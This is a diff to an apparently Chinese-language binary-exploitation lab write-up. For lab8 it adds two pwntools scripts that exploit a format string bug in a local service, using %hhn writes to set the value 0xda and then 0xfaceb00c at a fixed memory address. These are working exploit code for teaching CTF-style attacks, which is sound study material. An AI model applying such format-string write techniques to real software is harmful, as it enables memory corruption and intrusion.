@@ -229,13 +229,60 @@ r.interactive()
 lab8
 ---
 
-可以看成有三題
+有二題
 
 1. 寫 0xda
 2. 寫 0xfaceb00c
-3. get shell
+
+第一個，直接寫 0xda
+```python
+#!/usr/bin/env python
+from pwn import *
+context.arch = 'i386'
+r = remote('127.0.0.1', 1234)
+info(r.recvrepeat(0.2))
+raw_input("#")
+magic = 0x804a038
+r.sendline(p32(magic) + "%214c%7$hhn")
+r.interactive()
+```
 
 
+第二個是寫 0xfaceb00c
+
+```python
+#!/usr/bin/env python
+from pwn import *
+context.arch = 'i386'
+r = remote('127.0.0.1', 1234)
+
+def fmt(prev, value, idx):
+	r = ""
+	if prev < value:
+		r += "%" + str(value - prev) + "c"
+	elif prev > value:
+		r += "%" + str(value - prev + 256) + "c"
+	else:
+		pass
+	r += "%" + str(idx) + "$hhn"
+	return r
+
+magic = 0x0804a038
+target = 0xfaceb00c
+prev = 16
+payload = ""
+for i in range(4):
+	payload += fmt(prev, (target >> i*8) & 0xff, 7 + i)
+	prev = (target >> i*8) & 0xff
+
+payload = ''.join(p32(magic + i) for i in range(4)) + payload
+print "payload: ", repr(payload)
+
+raw_input("#")
+r.send(payload)
+
+r.interactive()
+```
 
 
 lab9
